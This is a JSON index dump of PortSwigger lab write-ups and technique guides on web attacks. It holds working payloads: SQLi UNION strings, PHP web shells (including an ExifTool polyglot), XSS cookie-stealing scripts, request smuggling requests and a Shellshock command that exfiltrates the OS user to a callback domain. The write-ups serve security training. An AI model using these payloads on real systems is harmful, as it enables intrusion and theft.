    "c": "JWT authentication bypass via flawed signature verification  Description  This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs. Reproduction and proof of concept  In the lab, log in to your own account. In Burp, go to the Proxy -> HTTP history tab and look at the post-login GET /my-account request. Observe that your session cookie is a JWT. Double-click the payload part of the token to view its decoded JSON form in the Inspector panel. Notice that the sub claim contains your username. Send this request to Burp Repeater. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user. Select the payload of the JWT again. In the Inspector panel, change the value of the sub claim to administrator, then click Apply changes . Select the header of the JWT, then use the Inspector to change the value of the alg parameter to none . Click Apply changes . In the message editor, remove the signature from the JWT, but remember to leave the trailing dot after the payload. Send the request and observe that you have successfully accessed the admin panel. In the response, find the URL for deleting Carlos ( /admin/delete?username=carlos ). Send the request to this endpoint to solve the lab. Exploitability  An attacker will need to log in to wiener:peter ; modify the session token to gain access to the admin panel at /admin , then delete the user carlos .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b6951439ef55a79ce9d7182157888abf",
    "u": "https://webapp.tymyrddin.dev/docs/acl/13",
    "t": "Referer-based access control ",
    "c": "Referer-based access control  Description  This lab controls access to certain admin functionality based on the Referer header. You can familiarise yourself with the admin panel by logging in using the credentials administrator:admin . Reproduction and proof of concept  Log in using the admin credentials administrator:admin . Browse to the admin panel, promote carlos , and send the HTTP request to Burp Repeater. Open a private/incognito browser window, and log in with the non-admin credentials. Browse to /admin-roles?username=carlos&action=upgrade and observe that the request is treated as unauthorised due to the absent Referer header. Copy the non-admin user’s session cookie into the existing Burp Repeater request, change the username to yours, and replay it. Exploitability  An attacker will need to log in using the credentials wiener:peter and exploit the flawed access controls to become an administrator.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5948bbc97f2e2b49b8aa6c3ae365aec2",
    "u": "https://webapp.tymyrddin.dev/docs/headers/2",
    "t": "Host header authentication bypass ",
    "c": "Host header authentication bypass  Description  This lab makes an assumption about the privilege level of the user based on the HTTP Host header. Reproduction  Send the GET / request that received a 200 response to Burp Repeater. Notice that you can change the Host header to an arbitrary value and still successfully access the home page. Browse to /robots.txt and observe that there is an admin panel at /admin . Try and browse to /admin . You do not have access, but notice the error message, which reveals that the panel can be accessed by local users. Send the GET /admin request to Burp Repeater. In Burp Repeater, change the Host header to localhost and send the request. Observe that you have now successfully accessed the admin panel, which provides the option to delete different users. Change the request line to GET /admin/delete?username=carlos and send the request to delete Carlos and solve the lab. PoC  Exploitability  An attacker will need to access the admin panel and delete Carlos’s account.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d705f46f7ed1343ede9b015d564bb7d5",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/1",
    "t": "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data ",
    "c": "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data  Description  This lab an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following: SELECT * FROM products WHERE category = 'Gifts' AND released = 1 Reproduction and proof of concept  Use Burp Suite to intercept and modify the request that sets the product category filter. Modify the category parameter, adding a ' Create payload, submit the request, and verify that the response now contains additional items. https://lab-id.web-security-academy.net/filter?category=Pets' OR 1=1 -- Exploitability  An attacker needs to perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "247b366bdad87b4d1b226e2d0b839793",
    "u": "https://webapp.tymyrddin.dev/docs/id/4",
    "t": "Authentication bypass via information disclosure ",
    "c": "Authentication bypass via information disclosure  Description  This lab ’s administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end. Reproduction and proof of concept  In Burp Repeater, browse to GET /admin . The response discloses that the admin panel is only accessible if logged in as an administrator, or if requested from a local IP. Send the request again, but this time use the TRACE method: TRACE /admin Study the response. Notice that the X-Custom-IP-Authorization header, containing your IP address, was automatically appended to your request. This is used to determine whether the request came from the localhost IP address. Go to Proxy -> Options , scroll down to the Match and Replace section, and click Add . Leave the match condition blank, but in the Replace field, enter X-Custom-IP-Authorization: 127.0.0.1 . Burp Proxy will now add this header to every request you send. Browse to the home page. You now have access to the admin panel, where you can delete Carlos. Exploitability  An attacker will need to log in to wiener:peter ; obtain the header name then use it to bypass the lab’s authentication; and access the admin interface to delete Carlos’s account.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b088e735d1032014ef5b98346245be82",
    "u": "https://webapp.tymyrddin.dev/docs/upload/6",
    "t": "Remote code execution via polyglot web shell upload ",
    "c": "Remote code execution via polyglot web shell upload  Description  This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code. Reproduction and proof of concept  On your system, create a file called exploit.php containing a script for fetching the contents of Carlos’s secret. For example: <?php echo file_get_contents('/home/carlos/secret'); ?> Log in and attempt to upload the script as your avatar. Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file. � Back to My Account The server successfully blocks uploading files that are not images, even if you try using techniques used in previous labs. Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows: exiftool -Comment=\"<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>\" nina.jpg -o polyglot.php This adds the PHP payload to the image’s Comment field, then saves the image with a .php extension. In your browser, upload the polyglot image as your avatar, then go back to your account page. In Burp’s proxy history, find the GET /files/avatars/polyglot.php request. Use the message editor’s search feature to find the START string somewhere within the binary image data in the response. Between this and the END string, you should see Carlos’s secret: Submit the secret to solve the lab. Exploitability  An attacker will need to log in; upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret ; and then enter this secret using the button provided in the lab banner.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "fff80db813dc7103a6f26a25b18845c7",
    "u": "https://webapp.tymyrddin.dev/docs/xss/28",
    "t": "Reflected XSS with AngularJS sandbox escape and CSP ",
    "c": "Reflected XSS with AngularJS sandbox escape and CSP  Description  The website in this lab uses CSP and AngularJS. Since Chrome 109 the path property has been removed. The workaround is to use composedPath() instead. That goes for Firefox as well. According to MDN, all major browsers support composedPath as of January 2023. Chrome (and other Chromium-based browsers) supported both path (it was a Chrome innovation) and composedPath until v109 when path was removed. (The obsolete browsers IE11 and Legacy Edge didn’t support either of them). Reproduction and proof of concept  Go to the exploit server and paste the following code, replacing 0a5a009b039d93c0c0374b3300ea00c7 with your lab ID: <script> location='https://0a5a009b039d93c0c0374b3300ea00c7.web-security-academy.net/?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x'; </script> URL encoded: <script> location='https://0a5a009b039d93c0c0374b3300ea00c7.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; </script> Click Store and Deliver exploit to victim . The exploit uses the ng-focus event in AngularJS to create a focus event that bypasses CSP. It also uses $event , which is an AngularJS variable that references the event object. The path property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the window object. Normally, | is a bitwise or operation in JavaScript, but in AngularJS it indicates a filter operation, in this case the orderBy filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the alert function directly, we assign it to the variable z . The function will only be called when the orderBy operation reaches the window object in the $event.composedPath() array. This means it can be called in the scope of the window without an explicit reference to the window object, effectively bypassing AngularJS’s window check.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8896eefc8ff9e845b60a79acc84e2b48",
    "u": "https://webapp.tymyrddin.dev/docs/auth/5",
    "t": "Username enumeration via response timing ",
    "c": "Username enumeration via response timing  Description  This lab is vulnerable to username enumeration using its response times. Reproduction and proof of concept  With Burp running, submit an invalid username and password, then send the POST /login request to Burp Repeater. Experiment with different usernames and passwords. Notice that your IP will be blocked if you make too many invalid login attempts. Identify that the X-Forwarded-For header is supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection. Continue experimenting with usernames and passwords. Pay particular attention to the response times. Notice that when the username is invalid, the response time is roughly the same. However, when you enter a valid username (your own), the response time is increased depending on the length of the password you entered. Send this request to Burp Intruder and select the attack type to Pitchfork. Clear the default payload positions and add the X-Forwarded-For header. Add payload positions for the X-Forwarded-For header and the username parameter. Set the password to a very long string of characters (about 100 characters should do it). On the Payloads tab, select payload set 1. Select the Numbers payload type. Enter the range 1 - 100 and set the step to 1. Set the max fraction digits to 0. This will be used to spoof your IP. Select payload set 2 and add the list of usernames. Start the attack. When the attack finishes, at the top of the dialog, click Columns and select the Response received and Response completed options. These two columns are now displayed in the results table. Notice that one of the response times was significantly longer than the others. Repeat this request a few times to make sure it consistently takes longer, then make a note of this username. Create a new Burp Intruder attack for the same request. Add the X-Forwarded-For header again and add a payload position to it. Insert the username that you just identified and add a payload position to the password parameter. On the Payloads tab, add the list of numbers in payload set 1 and add the list of passwords to payload set 2. Start the attack. When the attack is finished, find the response with a 302 status. Make a note of this password. Log in using and intercept with the username and password that you identified and access the user account page to solve the lab. Add the X-Forwarded-For header. POST /login HTTP/1.1 Host: 0af3007104462feac2d47a67002c0081.web-security-academy.net Cookie: session=WCbu6iReHErvSgSNI41rkLgZi2JE3afX User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 34 Origin: https://0af3007104462feac2d47a67002c0081.web-security-academy.net Referer: https://0af3007104462feac2d47a67002c0081.web-security-academy.net/login Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Te: trailers Connection: close X-Forwarded-For: 501 username=appserver&password=qazwsx Exploitability  An attacker will need to log into wiener:peter , and enumerate a valid username , brute-force this user’s password , then access their account page.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b76e1d0289e6cb72fde54bb1c614fb7f",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/2",
    "t": "HTTP request smuggling, basic TE.CL vulnerability ",
    "c": "HTTP request smuggling, basic TE.CL vulnerability  Description  This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren’t using the GET or POST method. Reproduction and proof of concept  In Burp Suite, disable the Autoupdate content length in Repeater (in the topmost menu row) Using Burp Repeater, issue the following request twice: POST / HTTP/1.1 Host: lab-id.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 The second (or third) response should say: Unrecognized method GPOST . Exploitability  An attacker will need to smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "7b69bf67cb3a892298637da3ecfbc72c",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/5",
    "t": "HTTP request smuggling, confirming a TE.CL vulnerability via differential responses ",
    "c": "HTTP request smuggling, confirming a TE.CL vulnerability via differential responses  Description  This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. There’s an admin panel at /admin, but the front-end server blocks access to it. Reproduction and proof of concept  Using Burp Repeater, issue the following request twice: POST / HTTP/1.1 Host: lab-id.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 The second request should receive an HTTP 404 response. Exploitability  An attacker will need to smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response. In this case the TE.CL vulnerability must be exploited via differential response.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "eaeb869b43d5eba75e82ab63269f57ee",
    "u": "https://webapp.tymyrddin.dev/docs/xss/5",
    "t": "DOM XSS in jQuery anchor href attribute sink using location.search source ",
    "c": "DOM XSS in jQuery anchor href attribute sink using location.search source  Description  The website in this lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library’s $ selector function to find an anchor element, and changes its href attribute using data from location.search . Reproduction and proof of concept  On the Submit feedback page, change the query parameter returnPath to / followed by a random alphanumeric string. Right-click and inspect the element, and observe that your random string has been placed inside an a href attribute. Change returnPath to: javascript:alert(document.cookie) For example: https://0a1800ac03209537c12be0bd005f00f0.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie) Hit enter and click the Back button on the site to trigger the attack.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5828269731d048dafba109df914cc6ea",
    "u": "https://webapp.tymyrddin.dev/docs/ssrf/7",
    "t": "Blind SSRF with Shellshock exploitation ",
    "c": "Blind SSRF with Shellshock exploitation  Description  This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded. Reproduction and proof of concept  In Burp Suite Professional, install (or load) the “Collaborator Everywhere” extension from the BApp Store. Add the domain of the lab to Burp Suite’s target scope, so that Collaborator Everywhere will target it. Browse the site. Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header. Observe that the HTTP interaction contains your User-Agent string within the HTTP request. Build the attack in Repeater, then send the request to the product page to Burp Intruder: Go to the Collaborator tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload: () { :; }; /usr/bin/nslookup $(whoami).burp-collab-subdomain Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain. Once in Intruder, click Clear § , change the Referer header to http://192.168.0.1:8080 then highlight the final octet of the IP address (the number 1), click Add § . Switch to the Payloads tab, change the payload type to Numbers, and enter 1 , 255 , and 1 in the From and To and Step boxes respectively. Click Start attack . When the attack is finished, go back to the Collaborator tab, and click Poll now . You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind SSRF attack. The name of the OS user should appear within the DNS subdomain. If you don’t see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. To complete the lab, enter the name of the OS user as solution. Exploitability  An attacker will need to use the analytics functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080 and use a Shellshock payload against the internal server to exfiltrate the name of the OS user. Note: To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, an attacker must use Burp Collaborator’s default public server.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "718c22a35731135f19eef26ec35bd277",
    "u": "https://webapp.tymyrddin.dev/docs/csrf/8",
    "t": "SameSite Strict bypass via client-side redirect ",
    "c": "SameSite Strict bypass via client-side redirect  Description  This lab ’s change email function is vulnerable to CSRF. Reproduction and proof of concept  Study the change email function  In Burp’s browser, log in to the wiener account and change its email address. In Burp, go to the Proxy -> HTTP history tab. Study the POST /my-account/change-email request and notice that this doesn’t contain any unpredictable tokens. It may be vulnerable to CSRF if you can bypass any SameSite cookie restrictions. Look at the response to the POST /login request. The website explicitly specifies SameSite=Strict when setting session cookies. This prevents the browser from including these cookies in cross-site requests. Identify a suitable gadget  In the browser, go to one of the blog posts and post an arbitrary comment. Observe that you are initially sent to a confirmation page at /post/comment/confirmation?postId=x but, after a few seconds, you are taken back to the blog post. In Burp, go to the proxy history and notice that this redirect is handled client-side using the imported JavaScript file /resources/js/commentConfirmationRedirect.js . Study the JavaScript and notice that this uses the postId query parameter to dynamically construct the path for the client-side redirect. In the proxy history, right-click on the GET /post/comment/confirmation?postId=x request and select Copy URL . In the browser, visit this URL, but change the postId parameter to an arbitrary string. /post/comment/confirmation?postId=foo Observe that you initially see the post confirmation page before the client-side JavaScript attempts to redirect you to a path containing the injected string /post/foo . Try injecting a path traversal sequence so that the dynamically constructed redirect URL will point to your account page: /post/comment/confirmation?postId=1/../../my-account Observe that the browser normalises this URL and successfully takes you to the MyAccount page. This confirms that the postId parameter can be used to elicit a GET request for an arbitrary endpoint on the target site. Bypass the SameSite restrictions  In the browser, go to the exploit server and create a script that induces the viewer’s browser to send the GET request you just tested: <script> document.location = \"https://0add007d0376cc05c083db48006a005c.web-security-academy.net/post/comment/confirmation?postId=../my-account\"; </script> Store and view exploit. Observe that when the client-side redirect takes place, you still end up on your logged-in account page. This confirms that the browser included your authenticated session cookie in the second request, even though the initial comment-submission request was initiated from an arbitrary external site. Craft an exploit  Send the POST /my-account/change-email request to Burp Repeater. In Burp Repeater, right-click on the request and select Change request method. Burp automatically generates an equivalent GET request. Send the request. Observe that the endpoint allows you to change your email address using a GET request. Go back to the exploit server and change the postId parameter in your exploit so that the redirect causes the browser to send the equivalent GET request for changing your email address: <script> document.location = \"https://0add007d0376cc05c083db48006a005c.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=gotcha%40web-security-academy.net%26submit=1\"; </script> Note: include the submit parameter and URL encode the ampersand delimiter to avoid breaking out of the postId parameter in the initial setup request. Test the exploit and confirm that it has successfully changed the email address. Deliver the exploit to the victim. After a few seconds, the lab is solved. Exploitability  An attacker needs to have an account.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "7e6ca29a62aefb169088d8275b77bdc7",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/9",
    "t": "SQL injection attack, listing the database contents on non-Oracle databases ",
    "c": "SQL injection attack, listing the database contents on non-Oracle databases  Description  This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so it is possible to use a UNION attack to retrieve data from other tables. Reproduction and proof of concept  Use Burp Suite to intercept and modify the request that sets the product category filter. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: '+UNION+SELECT+'abc','def'-- Use the following payload to retrieve the list of tables in the database: '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- Find the name of the table containing user credentials. Use the following payload (replacing the table name) to retrieve the details of the columns in the table: '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_okfnmf'-- Find the names of the columns containing usernames and passwords. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users: '+UNION+SELECT+username_uoclxg,+password_slibfj+FROM+users_okfnmf-- Find the password for the administrator user, and use it to log in. Exploitability  The application has a login function, and the database contains a table that holds usernames and passwords. An attacker needs to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users, and log in to the site as administrator .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "7843c7955fbdef70692dfd0d62362fe4",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/5",
    "t": "SQL injection UNION attack, retrieving data from other tables ",
    "c": "SQL injection UNION attack, retrieving data from other tables  Description  This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, it is possible to use a UNION attack to retrieve data from other tables. The database contains a different table called users, with columns called username and password. Reproduction and proof of concept  Use Burp Suite to intercept and modify the request that sets the product category filter. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: '+UNION+SELECT+'abc','def'-- Use the following payload to retrieve the contents of the users table: '+UNION+SELECT+username,+password+FROM+users-- Verify that the application’s response contains usernames and passwords. Log in as administrator. Exploitability  An attacker needs to perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "ecd6f13cc61b63431300af5c105fbf42",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/sop",
    "t": "Same-origin policy (SOP) ",
    "c": "Same-origin policy (SOP)  Websites often loosen the same-origin policy (SOP) to have more flexibility. These controlled and intended SOP bypasses can have adverse effects, as attackers can sometimes exploit misconfigurations in these techniques. These exploits can cause private information leaks and lead to more vulnerabilities, such as authentication bypass, account takeover, and large data breaches. Steps  Find out if the application uses any SOP relaxation techniques. Is the application using CORS, postMessage, or JSONP? If the site is using CORS, test the strength of the CORS allowlist by submitting test Origin headers. If the site is using postMessage, see if you can send or receive messages as an untrusted site. If the site is using JSONP, try to embed a script tag on your site and request the sensitive data wrapped in the JSONP payload. Determine the sensitivity of the information you can steal using the vulnerability, and see if you can do something more. Create report. Determine if SOP relaxation techniques are used  You can determine whether the target is using an SOP-relaxation technique by looking for the signatures of each SOP-relaxation technique. When you’re browsing a web application, open your proxy and look for any signs of cross-origin communication. For example, CORS sites will often return HTTP responses that contain an Access-Control-Allow-Origin header. A site could be using postMessage() if you inspect a page (for example, by right-clicking it in Chrome and choosing Inspect, then navigating to Event Listeners) and find a message event listener. And a site could be using JSONP if you see a URL being loaded in a script tag with a callback function. Find CORS misconfiguration  If the site is using CORS: Check whether the Access-Control-Allow-Origin response header is set to null . If not, send a request to the site with the origin header attacker.com , and see if the Access-Control-Allow-Origin in the response is set to attacker.com . Test whether the site properly validates the origin URL by submitting an Origin header that contains an allowed site, such as www.example.com.attacker.com . Check the Access-Control-Allow-Origin header returns the origin of the attacker’s domain. If one of these Access-Control-Allow-Origin header values is returned, you have found a CORS misconfiguration. Attackers will be able to bypass the SOP and exfiltrate data. Find postMessage bugs  If the site is using postMessage: See if you can send or receive messages as an untrusted site. Create an HTML page with an iframe that frames the targeted page accepting messages. Try to send messages to that page that trigger a state-changing behaviour. If the target cannot be framed, open it as a new window instead. You can also create an HTML page that listens for events coming from the target page, and trigger the postMessage from the target site. See if you can receive sensitive data from the target page. Find JSONP issues  If the site is using JSONP , see if you can embed a script tag and request the sensitive data wrapped in the JSONP payload. Consider mitigating factors  When the target site does not rely on cookies for authentication, these SOP bypass misconfigurations might not be exploitable. For instance, when the site uses custom headers or secret request parameters to authenticate requests, you might need to find a way to forge those to exfiltrate sensitive data. Escalation  An SOP-bypass bug often means that attackers can read private information or execute action as other users. This means that these vulnerabilities are often of high severity before any escalation attempts. But you can still escalate SOP-bypass issues by automation or by pivoting the attack using the information found. Many researchers will simply report CORS misconfigurations without showing the impact of the vulnerability. Consider the impact of the issue before sending the report. Portswigger lab writeups  CORS vulnerability with basic origin reflection CORS vulnerability with trusted null origin CORS vulnerability with trusted insecure protocols CORS vulnerability with internal network pivot attack Remediation  Origins specified in the Access-Control-Allow-Origin header should only be sites that are trusted. Dynamically reflecting origins from cross-origin requests without validation is exploitable and to be avoided. Also avoid using the header Access-Control-Allow-Origin: null . Cross-origin resource calls from internal documents and sandboxed requests can specify the null origin. CORS headers must be defined in respect of trusted origins for private and public servers. Avoid using wildcards in internal networks. Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external domains. CORS defines browser behaviours and is not a replacement for server-side protection of sensitive data - an attacker can directly forge a request from any trusted origin. Web servers should apply protections for sensitive data, such as authentication and session management, in addition to properly configured CORS. Resources  Portswigger: Same-origin policy (SOP) OWASP: Cross Site History Manipulation (XSHM) Exploiting CORS misconfigurations for Bitcoins and bounties, James Kettle StackStorm - From Originull to RCE - CVE-2019-9580 HackTricks: CORS - Misconfigurations & Bypass HackTricks: postMessage Vulnerabilities Bug Bounty Bootcamp Bug Bounty Hunting Essentials Bug Bounty Hunting for Web Security Think Outside the Scope: Advanced CORS Exploitation Techniques PayLoadsAllTheThings: CORS miscinfiguration",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c5d11b1cb3bad4e87ba34eb21768cb37",
    "u": "https://webapp.tymyrddin.dev/docs/acl/10",
    "t": "URL-based access control can be circumvented ",
    "c": "URL-based access control can be circumvented  Description  This website has an unauthenticated admin panel at /admin , but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header. Reproduction and proof of concept  Try to load /admin and observe that you get blocked. The response is very plain, suggesting it may originate from a front-end system. Send the request to Burp Repeater. Change the URL in the request line to / and add the HTTP header X-Original-URL: /invalid . Observe that the application returns a “not found” response. This indicates that the back-end system is processing the URL from the X-Original-URL header. Change the value of the X-Original-URL header to /admin . Observe that you can now access the admin page. To delete the user carlos , add ?username=carlos to the real query string, and change the X-Original-URL path to /admin/delete . Exploitability  An attacker will need to access the admin panel and delete the user carlos.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9f00d1a75165263a9ec1f4d36cba3b30",
    "u": "https://webapp.tymyrddin.dev/docs/upload/5",
    "t": "Web shell upload via obfuscated file extension ",
    "c": "Web shell upload via obfuscated file extension  Description  This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique. Reproduction and proof of concept  Log in and upload an image as your avatar, then go back to your account page. In Burp, go to Proxy -> HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> . Send this request to Burp Repeater. On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos’s secret. For example: <?php echo file_get_contents('/home/carlos/secret'); ?> Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload JPG and PNG files. Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file. � Back to My Account In Burp’s proxy history, find the POST /my-account/avatar request that was used to submit the file upload. Send this to Burp Repeater. In Burp Repeater, go to the tab for the POST /my-account/avatar request and find the part of the body that relates to your PHP file. In the Content-Disposition header, change the value of the filename parameter to include a URL encoded null byte, followed by the .jpg extension: filename=\"exploit.php%00.jpg\" Send the request: The file was successfully uploaded. Notice that the message refers to the file as exploit.php , suggesting that the null byte and .jpg extension have been stripped. Switch to the other Repeater tab containing the GET /files/avatars/<YOUR-IMAGE> request. In the path, replace the name of your image file with exploit.php and send the request. Observe that Carlos’s secret was returned in the response. Submit the secret to solve the lab. Exploitability  An attacker will need to log in to wiener:peter ; upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret ; and then enter this secret using the button provided in the lab banner.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "680bc05d2d15229620c6a2598d059122",
    "u": "https://webapp.tymyrddin.dev/docs/acl/9",
    "t": "Insecure direct object references ",
    "c": "Insecure direct object references  Description  This lab stores user chat logs directly on the server’s file system, and retrieves them using static URLs. Reproduction and proof of concept  Select the Live chat tab. Send a message and then select View transcript . Review the URL and observe that the transcripts are text files assigned a filename containing an incrementing number. Change the filename to 1.txt and review the text. Notice a password within the chat transcript. Return to the main lab page and log in using the stolen credentials. Exploitability  An attacker will need to find the password for the user carlos , and log into their account.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "97379fcf9441ed8b250398cb8aa6b3bc",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/8",
    "t": "Exploiting HTTP request smuggling to reveal front-end request rewriting ",
    "c": "Exploiting HTTP request smuggling to reveal front-end request rewriting  Description  This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. There’s an admin panel at /admin , but it’s only accessible to people with the IP address 127.0.0.1 . The front-end server adds an HTTP header to incoming requests containing their IP address. It’s similar to the X-Forwarded-For header but has a different name. Reproduction and proof of concept  Browse to /admin and observe that the admin panel can only be loaded from 127.0.0.1 . Use the site’s search function and observe that it reflects the value of the search parameter. Use Burp Repeater to issue the following request twice. POST / HTTP/1.1 Host: lab-id.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 124 Transfer-Encoding: chunked 0 POST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 200 Connection: close search=test The second response should contain “Search results for” followed by the start of a rewritten HTTP request. <h1>0 search results for 'testPOST / HTTP/1.1 X-vneqTa-Ip: <my-ip> Host: 0adb005f049c4476c11158ad00f70056.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 124 Transfer'</h1> Make a note of the name of the X-*-IP header in the rewritten request, here it was vneqTa and use it to access the admin panel: POST / HTTP/1.1 Host: lab-id.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 143 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 X-vneqTa-Ip: 127.0.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: 10 Connection: close x=1 Using the previous response as a reference, change the smuggled request URL to delete the user carlos : Exploitability  An attacker will need to smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then the attackers will need to smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "4cd4d87f4fb8e17464aa9bb269591a3f",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/ssrf",
    "t": "Server-side request forgery (SSRF) ",
    "c": "Server-side request forgery (SSRF)  A server-side request forgery (SSRF) attack involves forcing some server-side application to make HTTP requests to a domain of our choosing. This can sometimes grant access to internal resources or unprotected admin panels. Steps  Spot the features prone to SSRFs and take notes for future reference. Set up a callback listener to detect blind SSRFs by using an online service, Netcat, or Burp’s Collaborator feature. Provide the potentially vulnerable endpoints with common internal addresses or the address of your callback listener. Check if the server responds with information that confirms the SSRF. Or, in the case of a blind SSRF, check your server logs for requests from the target server. In the case of a blind SSRF, check if the server behaviour differs when you request different hosts or ports. If SSRF protection is implemented, try to bypass it by using the strategies discussed in this chapter. Pick a tactic to escalate the SSRF. Draft report. Spot features prone to SSRFs  SSRFs occur in features that require visiting and fetching external resources. These include webhooks, file uploads, document and image processors, link expansions or thumbnails, and proxy services. It is also worth testing any endpoint that processes a user-provided URL. And pay attention to potential SSRF entry points that are less obvious, like URLs embedded in files that are processed by the application (XML files and PDF files can often be used to trigger SSRFs), hidden API endpoints that accept URLs as input, and input that gets inserted into HTML tags. Provide potentially vulnerable endpoints with internal URLs  Once you’ve identified the potentially vulnerable endpoints, provide internal addresses as the URL inputs to these endpoints. Depending on the network configuration, you might need to try several addresses before you find the ones in use by the network. Check the results  In the case of regular SSRF, see if the server returns a response that reveals any information about the internal service. For example, does the response contain service banners or the content of internal pages? The easiest way of detecting blind SSRFs is through out-of-band techniques: you make the target send 